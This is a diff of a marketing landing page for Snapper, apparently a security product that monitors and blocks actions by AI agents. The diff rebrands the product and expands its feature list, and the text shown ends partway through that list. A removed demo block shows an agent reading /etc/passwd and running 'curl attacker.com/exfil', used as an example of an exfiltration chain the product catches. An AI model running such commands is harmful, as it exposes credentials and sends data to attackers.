@@ -4,15 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <base href="/">
-<title>Snapper — Agent Application Firewall for the Enterprise</title>
-<meta name="description" content="Snapper is the enterprise Agent Application Firewall. Bot-in-the-loop approvals via Telegram & Slack bots, bad actor detection, PII vault, kill chain analysis, SIEM integration. Protect your AI agents at the boundary.">
-<meta property="og:title" content="Snapper — Agent Application Firewall">
-<meta property="og:description" content="Enterprise firewall for AI agents. Bot-in-the-loop approvals via Telegram & Slack bots, bad actor detection, PII vault, kill chain analysis, SIEM/SOAR integration. Your agents keep full power. You keep full control.">
+<title>Snapper — AI Agent Security Platform</title>
+<meta name="description" content="Snapper is the enterprise AI Agent Security Platform. Runtime enforcement, EU AI Act compliance, AI FinOps, network proxy, code scanner, intent classification, output guardrails, hierarchical agent control, encrypted PII vault, and developer SDK. Protect your AI agents at every layer.">
+<meta property="og:title" content="Snapper — AI Agent Security Platform">
+<meta property="og:description" content="AI Agent Security Platform. Runtime enforcement, EU AI Act compliance, AI FinOps, network proxy, code scanner, shadow AI detection, developer SDK. Your agents keep full power. You keep full control.">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://snapperprotect.com">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Snapper — Agent Application Firewall">
-<meta name="twitter:description" content="Enterprise firewall for AI agents. Bot-in-the-loop approvals, Telegram & Slack alerting, kill chain analysis, PII vault, SIEM integration.">
+<meta name="twitter:title" content="Snapper — AI Agent Security Platform">
+<meta name="twitter:description" content="AI Agent Security Platform. Runtime enforcement, EU AI Act compliance, AI FinOps, network proxy, code scanner, intent classification, hierarchical agent control.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -34,6 +34,7 @@
   --red: #ef4444;
   --amber: #f59e0b;
   --blue: #3b82f6;
+  --purple: #a855f7;
   --font-display: 'Outfit', sans-serif;
   --font-mono: 'IBM Plex Mono', monospace;
 }
@@ -230,6 +231,67 @@ nav {
 }
 .btn-secondary:hover { border-color: var(--text-dim); color: var(--text-bright); text-decoration: none; }
 
+/* ─── PILLARS ─── */
+.pillars-strip {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 14px;
+  margin-top: 48px;
+  opacity: 0;
+  animation: fadeUp 0.6s ease forwards 0.6s;
+}
+.pillar-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px 18px;
+  text-align: center;
+  transition: border-color 0.2s;
+}
+.pillar-card:hover { border-color: var(--accent); }
+.pillar-card .pillar-icon {
+  font-size: 24px;
+  margin-bottom: 10px;
+}
+.pillar-card h3 {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--text-bright);
+  margin-bottom: 6px;
+  letter-spacing: -0.2px;
+}
+.pillar-card p {
+  font-size: 12px;
+  color: var(--text-dim);
+  line-height: 1.5;
+}
+@media (max-width: 768px) {
+  .pillars-strip { grid-template-columns: repeat(2, 1fr); }
+}
+
+/* ─── STAT BADGES ─── */
+.hero-stats {
+  display: flex;
+  gap: 20px;
+  flex-wrap: wrap;
+  margin-top: 32px;
+  opacity: 0;
+  animation: fadeUp 0.6s ease forwards 0.55s;
+}
+.hero-stat {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  color: var(--text-dim);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.hero-stat .hs-num {
+  color: var(--accent);
+  font-weight: 600;
+  font-size: 14px;
+}
+
 /* ─── LOGO BAR ─── */
 .hero-code {
   margin-top: 48px;
@@ -326,13 +388,46 @@ nav {
   line-height: 1.3;
   letter-spacing: -0.5px;
   max-width: 700px;
-  margin-bottom: 24px;
+  margin-bottom: 32px;
 }
 .problem p {
   font-size: 16px;
   color: var(--text-dim);
   max-width: 640px;
   line-height: 1.75;
+}
+.problem-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 16px;
+  margin-top: 36px;
+}
+.problem-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 24px 20px;
+  transition: border-color 0.2s;
+}
+.problem-card:hover { border-color: rgba(239, 68, 68, 0.3); }
+.problem-card .prob-icon {
+  font-size: 20px;
+  margin-bottom: 12px;
+}
+.problem-card h3 {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--text-bright);
+  margin-bottom: 6px;
+}
+.problem-card p {
+  font-size: 13px;
+  color: var(--text-dim);
+  line-height: 1.6;
+  max-width: none;
+}
+@media (max-width: 768px) {
+  .problem-grid { grid-template-columns: 1fr; }
 }
 
 /* ─── SOLUTION ─── */
@@ -363,6 +458,61 @@ nav {
   max-width: 640px;
   line-height: 1.75;
 }
+
+/* ─── GAP TABLE ─── */
+.gap-section {
+  padding: 0 0 80px;
+}
+.gap-section h3 {
+  font-size: 14px;
+  font-family: var(--font-mono);
+  font-weight: 600;
+  color: var(--amber);
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  margin-bottom: 20px;
+}
+.gap-section .statement {
+  font-size: clamp(20px, 2.5vw, 28px);
+  font-weight: 700;
+  color: var(--text-bright);
+  line-height: 1.3;
+  letter-spacing: -0.5px;
+  max-width: 700px;
+  margin-bottom: 32px;
+}
+.gap-table-wrap {
+  overflow-x: auto;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  background: var(--bg-card);
+}
+.gap-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+  min-width: 700px;
+}
+.gap-table th {
+  padding: 14px 14px;
+  text-align: left;
+  font-weight: 600;
+  color: var(--text-bright);
+  border-bottom: 1px solid var(--border);
+  background: var(--bg-elevated);
+  white-space: nowrap;
+}
+.gap-table td {
+  padding: 10px 14px;
+  border-bottom: 1px solid rgba(26, 34, 51, 0.6);
+  color: var(--text-dim);
+  font-size: 13px;
+}
+.gap-table td:first-child {
+  font-weight: 500;
+  color: var(--text);
+}
+.gap-table tr:last-child td { border-bottom: none; }
 
 /* ─── FEATURES ─── */
 .features { padding: 40px 0 80px; }
@@ -420,6 +570,7 @@ nav {
 .feature-icon.amber { background: rgba(245, 158, 11, 0.12); }
 .feature-icon.red { background: rgba(239, 68, 68, 0.12); }
 .feature-icon.purple { background: rgba(168, 85, 247, 0.12); }
+.feature-icon.cyan { background: rgba(6, 182, 212, 0.12); }
 .feature-card h3 {
   font-size: 18px;
   font-weight: 700;
@@ -457,26 +608,68 @@ nav {
   font-size: 16px;
   color: var(--text-dim);
   text-align: center;
-  max-width: 540px;
+  max-width: 640px;
   margin: 0 auto 48px;
 }
-.arch-diagram {
+.arch-flow {
+  display: grid;
+  grid-template-columns: 1fr auto 1fr auto 1fr;
+  gap: 0;
+  align-items: stretch;
+}
+.arch-column {
   background: var(--bg-card);
   border: 1px solid var(--border);
   border-radius: 12px;
-  padding: 40px 32px;
-  font-family: var(--font-mono);
-  font-size: 13px;
-  line-height: 1.8;
-  color: var(--text-dim);
-  overflow-x: auto;
-  white-space: pre;
-  text-align: center;
+  padding: 28px 24px;
 }
-.arch-diagram .node { color: var(--text-bright); font-weight: 600; }
-.arch-diagram .allow { color: var(--accent); }
-.arch-diagram .deny { color: var(--red); }
-.arch-diagram .approve { color: var(--amber); }
+.arch-column.snapper-col-arch {
+  border-color: rgba(16, 185, 129, 0.3);
+  background: linear-gradient(135deg, var(--bg-card) 0%, rgba(16, 185, 129, 0.04) 100%);
+}
+.arch-column h3 {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  margin-bottom: 16px;
+}
+.arch-column h3.src-label { color: var(--blue); }
+.arch-column h3.snap-label { color: var(--accent); }
+.arch-column h3.prot-label { color: var(--amber); }
+.arch-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 0;
+  font-size: 13px;
+  color: var(--text);
+}
+.arch-item .arch-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+.arch-item .arch-dot.blue { background: var(--blue); }
+.arch-item .arch-dot.green { background: var(--accent); }
+.arch-item .arch-dot.amber { background: var(--amber); }
+.arch-arrow {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  color: var(--text-dim);
+  padding: 0 12px;
+}
+@media (max-width: 768px) {
+  .arch-flow {
+    grid-template-columns: 1fr;
+    gap: 12px;
+  }
+  .arch-arrow { transform: rotate(90deg); padding: 8px 0; }
+}
 
 /* ─── INTEGRATION ─── */
 .integration { padding: 80px 0; border-top: 1px solid var(--border); }
@@ -527,6 +720,8 @@ nav {
 .integration-card .int-icon.blue { background: rgba(59, 130, 246, 0.12); }
 .integration-card .int-icon.amber { background: rgba(245, 158, 11, 0.12); }
 .integration-card .int-icon.purple { background: rgba(168, 85, 247, 0.12); }
+.integration-card .int-icon.red { background: rgba(239, 68, 68, 0.12); }
+.integration-card .int-icon.cyan { background: rgba(6, 182, 212, 0.12); }
 .integration-card h3 {
   font-size: 18px;
   font-weight: 700;
@@ -630,7 +825,7 @@ nav {
   width: 100%;
   border-collapse: collapse;
   font-size: 13px;
-  min-width: 860px;
+  min-width: 700px;
 }
 .comp-table th {
   padding: 16px 14px;
@@ -684,12 +879,62 @@ nav {
   line-height: 1.6;
 }
 .comp-note strong { color: var(--accent); }
+.witness-compare {
+  margin-top: 24px;
+  padding: 24px 28px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+}
+.witness-compare h3 {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--text-bright);
+  margin-bottom: 12px;
+}
+.witness-compare p {
+  font-size: 14px;
+  color: var(--text-dim);
+  line-height: 1.7;
+  margin-bottom: 12px;
+}
+.witness-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-top: 16px;
+}
+.witness-card {
+  padding: 16px;
+  border-radius: 8px;
+  border: 1px solid var(--border);
+}
+.witness-card.old { background: rgba(239, 68, 68, 0.04); border-color: rgba(239, 68, 68, 0.15); }
+.witness-card.new { background: rgba(16, 185, 129, 0.04); border-color: rgba(16, 185, 129, 0.15); }
+.witness-card h4 {
+  font-size: 13px;
+  font-family: var(--font-mono);
+  font-weight: 600;
+  margin-bottom: 10px;
+  letter-spacing: 0.5px;
+}
+.witness-card.old h4 { color: var(--red); }
+.witness-card.new h4 { color: var(--accent); }
+.witness-card ul {
+  list-style: none;
+  font-size: 13px;
+  color: var(--text-dim);
+  line-height: 1.8;
+}
+@media (max-width: 640px) {
+  .witness-grid { grid-template-columns: 1fr; }
+}
 
 /* ─── STATS ─── */
 .stats { padding: 60px 0; border-top: 1px solid var(--border); }
 .stats-grid {
   display: grid;
-  grid-template-columns: repeat(5, 1fr);
+  grid-template-columns: repeat(4, 1fr);
   gap: 14px;
 }
 .stat-card {
@@ -744,7 +989,7 @@ nav {
 }
 .enterprise-grid {
   display: grid;
-  grid-template-columns: repeat(3, 1fr);
+  grid-template-columns: repeat(2, 1fr);
   gap: 20px;
 }
 .enterprise-card {
@@ -766,8 +1011,46 @@ nav {
   color: var(--text-dim);
   line-height: 1.7;
 }
+.enterprise-card .mono-detail {
+  margin-top: 12px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--accent);
+  background: var(--accent-dim);
+  padding: 6px 10px;
+  border-radius: 5px;
+  display: inline-block;
+}
+.deploy-strip {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 14px;
+  margin-top: 32px;
+}
+.deploy-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 20px 16px;
+  text-align: center;
+  transition: border-color 0.2s;
+}
+.deploy-card:hover { border-color: var(--accent); }
+.deploy-card .deploy-icon { font-size: 22px; margin-bottom: 8px; }
+.deploy-card h4 {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin-bottom: 4px;
+}
+.deploy-card p {
+  font-size: 12px;
+  color: var(--text-dim);
+  line-height: 1.5;
+}
 @media (max-width: 768px) {
   .enterprise-grid { grid-template-columns: 1fr; }
+  .deploy-strip { grid-template-columns: repeat(2, 1fr); }
 }
 
 /* ─── SECURITY & TRUST ─── */
@@ -865,6 +1148,43 @@ nav {
   margin-left: auto;
   margin-right: auto;
 }
+.cta-options {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 16px;
+  max-width: 900px;
+  margin: 0 auto 40px;
+  text-align: left;
+}
+.cta-option {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px 18px;
+  transition: border-color 0.2s;
+}
+.cta-option:hover { border-color: var(--accent); }
+.cta-option h4 {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--text-bright);
+  margin-bottom: 6px;
+}
+.cta-option p {
+  font-size: 12px;
+  color: var(--text-dim);
+  line-height: 1.5;
+  margin-bottom: 0;
+  max-width: none;
+  margin-left: 0;
+  margin-right: 0;
+}
+@media (max-width: 768px) {
+  .cta-options { grid-template-columns: repeat(2, 1fr); }
+}
+@media (max-width: 480px) {
+  .cta-options { grid-template-columns: 1fr; }
+}
 
 /* ─── FOOTER ─── */
 footer {
@@ -928,9 +1248,9 @@ footer a:hover { color: var(--accent); }
 <!-- HERO -->
 <section class="hero">
   <div class="container">
-    <div class="hero-eyebrow">The first Agent Application Firewall (AAF)</div>
+    <div class="hero-eyebrow">AI Agent Security Platform</div>
     <h1>Your agents keep <span class="accent">full power.</span><br>Your SOC keeps full control.</h1>
-    <p class="hero-sub">Snapper intercepts every AI agent action before it executes. Bot-in-the-loop approval model, heuristic threat detection, kill chain analysis, encrypted PII vault, SIEM integration, and real-time alerting via Telegram and Slack bots. Enterprise-grade security without crippling agent capability.</p>
+    <p class="hero-sub">Runtime enforcement &middot; EU AI Act compliance &middot; AI FinOps &middot; Developer SDK. Snapper intercepts every AI agent action at the boundary &mdash; SDK, network, browser, MCP, and CI/CD &mdash; with intent classification, output guardrails, and cross-agent correlation.</p>
     <div class="hero-actions">
       <a href="mailto:john@mckinleylabs.com?subject=Snapper%20Demo%20Request&amp;body=Hi%20John%2C%0A%0AI%27m%20interested%20in%20a%20demo%20of%20Snapper%20for%20our%20team.%0A%0ACompany%3A%20%0AUse%20case%3A%20%0ANumber%20of%20agents%3A%20%0A%0AThanks!" class="btn-primary">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
@@ -938,18 +1258,32 @@ footer a:hover { color: var(--accent); }
       </a>
       <a href="#features" class="btn-secondary">See how it works</a>
     </div>
-    <div class="hero-code">
-      <div class="code-bar">
-        <div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div>
-        <span>snapper threat detection — live</span>
+    <div class="hero-stats">
+      <div class="hero-stat"><span class="hs-num">160+</span> API Endpoints</div>
+      <div class="hero-stat"><span class="hs-num">27K+</span> MCP Servers</div>
+      <div class="hero-stat"><span class="hs-num">70+</span> AI Services Monitored</div>
+      <div class="hero-stat"><span class="hs-num">55+</span> AI Domains Proxied</div>
+    </div>
+    <div class="pillars-strip">
+      <div class="pillar-card">
+        <div class="pillar-icon">&#x1F6E1;</div>
+        <h3>Runtime Security</h3>
+        <p>Intent classification, kill chains, behavioral baselines, output guardrails</p>
       </div>
-      <div class="code-body">
-<span class="comment"># Snapper detects multi-step attack patterns in real time</span>
-<span class="cmd">agent</span> reads /etc/passwd              <span class="comment"># Signal: FILE_READ (sensitive path)</span>
-<span class="cmd">agent</span> runs curl attacker.com/exfil     <span class="comment"># Signal: NETWORK_SEND (external dest)</span>
-<span class="arg">→ Kill chain matched:</span> data_exfiltration  <span class="comment"># 2-stage state machine triggered</span>
-<span class="arg">→ Threat score:</span> 41.0 / 100             <span class="comment"># Composite: signals + baseline + chains</span>
-<span class="arg">→ Action:</span> <span style="color: var(--red);">BLOCKED</span> + alert sent to SOC  <span class="comment"># Score > threshold → automatic deny</span>
+      <div class="pillar-card">
+        <div class="pillar-icon">&#x2696;</div>
+        <h3>EU AI Act</h3>
+        <p>7 articles automated, evidence export, audit-ready compliance</p>
+      </div>
+      <div class="pillar-card">
+        <div class="pillar-icon">&#x1F4B0;</div>
+        <h3>AI FinOps</h3>
+        <p>Cost attribution, anomaly detection, chargeback reports</p>
+      </div>
+      <div class="pillar-card">
+        <div class="pillar-icon">&#x1F527;</div>
+        <h3>Developer SDK</h3>
+        <p>Python, TypeScript, Go wrappers with policy-as-code</p>
       </div>
     </div>
   </div>
@@ -958,7 +1292,7 @@ footer a:hover { color: var(--accent); }
 <!-- AGENTS BAR -->
 <section class="agents-bar">
   <div class="container">
-    <div class="agents-label">Protects every major AI agent platform — deploy in minutes</div>
+    <div class="agents-label">Protects every major AI agent platform &mdash; deploy in minutes</div>
     <div class="agents-grid">
       <div class="agent-chip"><span class="agent-dot"></span>OpenAI SDK</div>
       <div class="agent-chip"><span class="agent-dot"></span>Anthropic SDK</div>
@@ -977,8 +1311,69 @@ footer a:hover { color: var(--accent); }
 <section class="problem">
   <div class="container">
     <h2>The problem</h2>
-    <div class="statement">Your AI agents can run commands, access credentials, exfiltrate data, and install plugins. Your security team has zero visibility.</div>
-    <p>Enterprises face a binary choice: deploy AI agents with full access and accept the risk, or restrict them so heavily they can't deliver value. Neither option works when you're responsible for compliance, data protection, and incident response.</p>
+    <div class="statement">Your AI agents are acting without supervision. Existing security tools don't see agent behavior.</div>
+    <p>Firewalls, DLP, CASB, SIEM, and IAM were built for human users and network traffic. They have zero visibility into what AI agents do between receiving a prompt and returning a response. The result: a growing blind spot in your security posture.</p>
+    <div class="problem-grid">
+      <div class="problem-card">
+        <div class="prob-icon">&#x1F441;</div>
+        <h3>No Visibility</h3>
+        <p>AI agents execute tool calls, API requests, and file operations with no audit trail. Your SOC can't see what they're doing.</p>
+      </div>
+      <div class="problem-card">
+        <div class="prob-icon">&#x1F517;</div>
+        <h3>Multi-Agent Blind Spot</h3>
+        <p>Agents delegate to sub-agents, creating chains of actions no single tool monitors. Cross-agent correlation doesn't exist in legacy security.</p>
+      </div>
+      <div class="problem-card">
+        <div class="prob-icon">&#x1F4B8;</div>
+        <h3>Runaway AI Spend</h3>
+        <p>No cost attribution per agent, team, or project. Anomalous usage goes undetected until the invoice arrives.</p>
+      </div>
+      <div class="problem-card">
+        <div class="prob-icon">&#x2696;</div>
+        <h3>Regulatory Exposure</h3>
+        <p>EU AI Act enforcement begins in 148 days. Non-compliance carries penalties up to 3% of global revenue or &euro;15M.</p>
+      </div>
+      <div class="problem-card">
+        <div class="prob-icon">&#x1F47B;</div>
+        <h3>Shadow AI</h3>
+        <p>27,000+ MCP servers and 70+ browser-based AI services. Employees use AI tools your security team doesn't know about.</p>
+      </div>
+      <div class="problem-card">
+        <div class="prob-icon">&#x1F6A7;</div>
+        <h3>Developer Friction</h3>
+        <p>Lock down AI and developers route around controls. The security team becomes a bottleneck instead of an enabler.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- GAP TABLE -->
+<section class="gap-section">
+  <div class="container">
+    <h3>The gap</h3>
+    <div class="statement">Existing security tools weren't built for agent behavior</div>
+    <div class="gap-table-wrap">
+      <table class="gap-table">
+        <thead>
+          <tr>
+            <th>Tool</th>
+            <th>Built For</th>
+            <th>Agent Visibility</th>
+            <th>Action Governance</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Firewall / WAF</td><td>Network perimeter</td><td style="color:var(--red)">None</td><td style="color:var(--red)">None</td></tr>
+          <tr><td>DLP</td><td>Data at rest / in transit</td><td style="color:var(--amber)">Partial</td><td style="color:var(--red)">None</td></tr>
+          <tr><td>CASB</td><td>SaaS access control</td><td style="color:var(--red)">None</td><td style="color:var(--red)">None</td></tr>
+          <tr><td>SIEM</td><td>Log aggregation</td><td style="color:var(--amber)">Ingests logs</td><td style="color:var(--red)">None</td></tr>
+          <tr><td>IAM</td><td>User authentication</td><td style="color:var(--red)">None</td><td style="color:var(--red)">None</td></tr>
+          <tr><td>RunLayer</td><td>MCP gateway</td><td style="color:var(--amber)">MCP only</td><td style="color:var(--amber)">MCP only</td></tr>
+          <tr><td style="color:var(--accent);font-weight:600">Snapper</td><td style="color:var(--accent)">Agent boundary</td><td style="color:var(--accent)">Full (all layers)</td><td style="color:var(--accent)">Full (6 methods)</td></tr>
+        </tbody>
+      </table>
+    </div>
   </div>
 </section>
 
@@ -986,8 +1381,8 @@ footer a:hover { color: var(--accent); }
 <section class="solution">
   <div class="container">
     <h2 class="solution-label">The solution</h2>
-    <div class="statement">Snapper eliminates the tradeoff. A bot-in-the-loop approval model gives agents full capability while your security team keeps full visibility, real-time threat detection, and human override authority.</div>
-    <p>Snapper sits between the agent and the outside world as a bot-in-the-middle security layer. Every tool call is evaluated against configurable rules before execution. Known-safe operations auto-approve instantly. Risky actions pause the agent and route an approval request to your Telegram or Slack bot — complete with inline [Approve] / [Deny] buttons. PII-protected requests always require human sign-off. Heuristic bad actor detection identifies multi-step attack patterns. Kill chain state machines catch data exfiltration, credential theft, and privilege escalation in real time. PII lives in an AES-256-GCM encrypted vault the agent never touches. CEF/Syslog events flow to your SIEM. The result: full agent power with enterprise-grade governance.</p>
+    <div class="statement">Snapper is the AI Agent Security Platform. Four pillars cover the full agent lifecycle &mdash; from runtime enforcement to regulatory compliance.</div>
+    <p>Snapper sits at the boundary between AI agents and the outside world. Every tool call, API request, and data access is evaluated before execution. Intent classification categorizes actions across 12 categories with 3-tier confidence scoring. Output guardrails scan responses for PII leakage, prompt injection artifacts, and policy violations. Cross-agent correlation detects multi-agent attack patterns that no single-agent monitor can see. Hierarchical agent control enforces parent-child rule inheritance across 5 levels. The result: full agent power with enterprise-grade governance, EU AI Act compliance, and cost visibility.</p>
   </div>
 </section>
 
@@ -996,69 +1391,112 @@ footer a:hover { color: var(--accent); }
   <div class="container">
     <div class="features-header">
       <h2>Built for the enterprise</h2>
-      <p>Nine capabilities no other agent security tool provides.</p>
+      <p>Fifteen capabilities no other agent security tool provides.</p>
     </div>
     <div class="features-grid">
 
       <div class="feature-card highlight">
-        <div class="feature-icon red">🎯</div>
-        <h3>Bad Actor Detection Engine</h3>
-        <p>Heuristic threat detection on every request. 13 signal types extracted in under 2ms. 7 kill chain state machines detect multi-step attacks: data exfiltration, credential theft, PII harvesting, encoded exfil, privilege escalation, vault extraction, and living-off-the-land. Per-agent behavioral baselines detect anomalies. Composite scoring from 0-100 with automatic deny above threshold. Optional AI-powered threat review provides Claude-based deep analysis every 15 minutes for high-confidence verdict refinement.</p>
-        <span class="mono-detail">13 signals &middot; 7 kill chains &middot; &lt;2ms hot path &middot; behavioral baselines &middot; AI threat review</span>
+        <div class="feature-icon red">&#x1F3AF;</div>
+        <h3>Runtime Security &amp; Behavioral Intelligence</h3>
+        <p>Intent classification across 12 categories with 3-tier confidence scoring. Output guardrails scan every agent response for PII leakage, prompt injection artifacts, and policy violations. Cross-agent correlation detects coordinated multi-agent attacks. 13 signal types extracted in under 2ms. 7 kill chain state machines. Per-agent behavioral baselines with anomaly detection. Composite scoring 0&ndash;100 with automatic deny above threshold.</p>
+        <span class="mono-detail">Intent classification &middot; Output guardrails &middot; Cross-agent correlation &middot; 7 kill chains &middot; &lt;2ms</span>
       </div>
 
       <div class="feature-card highlight">
-        <div class="feature-icon green">🔐</div>
+        <div class="feature-icon green">&#x1F510;</div>
         <h3>Encrypted PII Vault</h3>
-        <p>Credit cards, SSNs, addresses, and API keys live in AES-256-GCM encrypted storage. Agents only see tokens like <code>{{SNAPPER_VAULT:a7f3b2c1...}}</code>. When the agent fills a payment form, you get a notification showing masked values, the destination, and the dollar amount. Approve from your phone. Tokens are domain-locked with 30-second TTL and one-read expiry.</p>
-        <span class="mono-detail">AES-256-GCM &middot; HKDF key derivation &middot; 30s TTL &middot; domain-locked &middot; one-read expiry</span>
+        <p>Credit cards, SSNs, addresses, and API keys live in AES-256-GCM encrypted storage with 18-category PII scanning. Agents only see tokens like <code>{{SNAPPER_VAULT:a7f3b2c1...}}</code>. When the agent fills a payment form, you get a notification showing masked values, the destination, and the dollar amount. Approve from your phone. Tokens are domain-locked with 30-second TTL and one-read expiry.</p>
+        <span class="mono-detail">AES-256-GCM &middot; 18-category scanner &middot; 30s TTL &middot; domain-locked &middot; one-read expiry</span>
       </div>
 
       <div class="feature-card highlight">
-        <div class="feature-icon blue">📱</div>
+        <div class="feature-icon blue">&#x1F4F1;</div>
         <h3>Bot-in-the-Loop Approvals</h3>
-        <p>Not every action needs a human — but dangerous ones do. Snapper's three-tier approval model auto-approves known-safe operations, requires human sign-off for risky ones (writes, deletes, external calls), and always demands approval for PII vault requests. When approval is needed, your dedicated Telegram or Slack bot sends a rich notification with inline [Approve] / [Deny] buttons. Approve from your phone in five seconds. The agent pauses and polls until you decide — then vault tokens are decrypted with a 30-second TTL and single-read expiry. Both bots support full command suites: manage rules, test commands, control your PII vault, view pending approvals, and hit the emergency kill switch. Webhook delivery and email alerts complete the notification stack.</p>
+        <p>Not every action needs a human &mdash; but dangerous ones do. Three-tier approval model: auto-approve known-safe operations, require human sign-off for risky ones, always demand approval for PII vault requests. Dedicated Telegram and Slack bots send rich notifications with inline [Approve] / [Deny] buttons. Both bots support full command suites: manage rules, test commands, control PII vault, view pending approvals, and hit the emergency kill switch.</p>
         <span class="mono-detail">Auto-approve &middot; Human-required &middot; PII-mandatory &middot; Telegram &middot; Slack &middot; Webhook &middot; Email</span>
       </div>
 
       <div class="feature-card highlight">
-        <div class="feature-icon red">🛡️</div>
+        <div class="feature-icon red">&#x1F6E1;</div>
         <h3>Defense in Depth</h3>
-        <p>16 rule types with a fail-closed engine. Blocks reverse shells, RCE, destructive commands, credential access, and 341+ malicious skills from the ClawHavoc campaign. Scans every tool call for raw PII across 30+ regex patterns. Threat score overrides add behavioral intelligence on top of static rules. No rules = deny. Errors = deny.</p>
-        <span class="mono-detail">16 rule types &middot; 341+ malicious skills &middot; 30+ PII patterns &middot; CVE coverage</span>
+        <p>16 rule types with a fail-closed engine. Canary probes verify agent liveness every 5 minutes with green/yellow/red health badges. Evaluation receipts provide cryptographic proof of policy checks with single-use verification tokens. Three-layer enforcement: static rules, behavioral intelligence, and threat score overrides. Blocks reverse shells, RCE, destructive commands, credential access, and 341+ malicious skills.</p>
+        <span class="mono-detail">16 rule types &middot; Canary probes &middot; Eval receipts &middot; 341+ malicious skills &middot; 30+ PII patterns</span>
       </div>
 
       <div class="feature-card highlight">
-        <div class="feature-icon amber">📡</div>
+        <div class="feature-icon amber">&#x1F4E1;</div>
         <h3>Security Feed Auto-Mitigation</h3>
-        <p>Snapper continuously monitors three security intelligence feeds and automatically creates mitigation rules when new vulnerabilities affect your agents' tools. The NVD (National Vulnerability Database) provides CVE data from NIST. The GitHub Advisory Database covers open-source package vulnerabilities. ClawHub — Snapper's own feed at api.clawhub.io — delivers agent-specific threat intelligence. When a new CVE matches an active agent tool, Snapper auto-generates deny or approval rules before the vulnerability can be exploited.</p>
-        <span class="mono-detail">NVD/NIST &middot; GitHub Advisories &middot; ClawHub agent intel &middot; auto-generated deny/approval rules</span>
+        <p>Continuously monitors three security intelligence feeds and automatically creates mitigation rules when new vulnerabilities affect your agents' tools. NVD (NIST) for CVE data, GitHub Advisory Database for open-source vulnerabilities, and ClawHub for agent-specific threat intelligence. When a new CVE matches an active agent tool, Snapper auto-generates deny or approval rules before the vulnerability can be exploited.</p>
+        <span class="mono-detail">NVD/NIST &middot; GitHub Advisories &middot; ClawHub agent intel &middot; auto-generated rules</span>
+      </div>
+
+      <div class="feature-card highlight">
+        <div class="feature-icon cyan">&#x1F310;</div>
+        <h3>Network Proxy</h3>
+        <p>Go binary that intercepts all agent network traffic at the OS level. SNI-based inspection and optional MITM for deep content analysis. Monitors 55+ AI provider domains including OpenAI, Anthropic, Google, Azure, AWS Bedrock, and more. Transparent enforcement &mdash; agents don't need code changes. Catches runtime bypass attempts that SDK-level hooks can't see.</p>
+        <span class="mono-detail">Go binary &middot; SNI/MITM &middot; 55+ AI domains &middot; transparent enforcement</span>
+      </div>
+
+      <div class="feature-card highlight">
+        <div class="feature-icon purple">&#x1F50D;</div>
+        <h3>Code Scanner (CI/CD)</h3>
+        <p>Static analysis tool that scans repositories for ungoverned AI code before it ships. 8 detection categories: unwrapped AI SDKs, hardcoded AI endpoints, leaked AI credentials, missing SDK dependencies, unregistered agent frameworks, unregistered MCP servers, AI infrastructure config, and unguarded prompts. SARIF output for GitHub Security tab. GitHub Action for automated PR checks.</p>
+        <span class="mono-detail">8 categories &middot; SARIF &middot; GitHub Action &middot; Go binary &middot; &lt;5s PR scans</span>
       </div>
 
       <div class="feature-card">
-        <div class="feature-icon amber">⚡</div>
+        <div class="feature-icon amber">&#x1F4B0;</div>
+        <h3>AI FinOps</h3>
+        <p>Cost attribution per agent, team, and project with 4-tier allocation hierarchy. Z-score anomaly detection flags unusual spending patterns in real time. Chargeback reports in FOCUS v1.3 format for finance teams. Budget alerts and automated throttling when spend exceeds thresholds. Full visibility into AI costs across every provider.</p>
+        <span class="mono-detail">Cost attribution &middot; Z-score anomaly &middot; FOCUS v1.3 chargeback &middot; 4-tier hierarchy</span>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon blue">&#x2696;</div>
